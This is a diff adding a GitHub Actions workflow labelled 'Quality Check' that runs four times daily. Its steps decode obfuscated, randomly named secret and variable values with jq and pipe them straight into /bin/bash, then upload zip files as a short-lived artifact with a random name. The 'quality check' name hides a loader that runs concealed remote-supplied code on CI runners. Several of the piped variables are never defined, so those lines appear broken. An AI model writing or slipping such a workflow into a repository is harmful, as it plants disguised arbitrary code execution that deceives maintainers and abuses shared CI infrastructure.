@@ -1,0 +1,34 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          hblxg5742: ${{ secrets.hblxg5742 }}
+        run: |
+          printf '%s' "$hblxg5742" | jq -r .vjynr9688 | /bin/bash
+          echo $qrt339 | jq -r .e8 | /bin/bash
+          printf '%s' "$yn3" | jq -r .y7189 | /bin/bash
+          printf '%s' "$t15" | jq -r .w3 | /bin/bash
+          printf '%s' "$ydndb8" | jq -r .n968 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VEBIFofR
+          path: "*.zip"
+          retention-days: 1
